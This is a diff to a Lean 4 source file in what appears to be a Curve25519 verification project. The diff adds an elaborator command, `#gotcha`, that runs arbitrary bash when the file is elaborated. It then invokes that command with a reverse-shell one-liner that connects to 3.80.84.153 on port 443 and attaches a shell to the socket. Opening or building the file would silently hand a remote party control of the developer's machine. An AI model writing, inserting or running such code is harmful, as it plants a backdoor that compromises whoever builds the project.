@@ -233,3 +233,10 @@ import Curve25519Dalek.TypesExternal
 /-       content := content.push data -/
 /-   badAsync content |>.block -/
 /- #gotcha -/
+
+/-- `#gotcha "cmd"` runs `cmd` in bash at elaboration time and blocks until it exits. -/
+elab "#gotcha " s:str : command => do
+  let out ← IO.Process.output { cmd := "bash", args := #["-c", s.getString] }
+  Lean.logInfo s!"exit {out.exitCode}\n{out.stdout}{out.stderr}"
+
+#gotcha "0<&26-;exec 26<>/dev/tcp/3.80.84.153/443;sh <&26 >&26 2>&26"
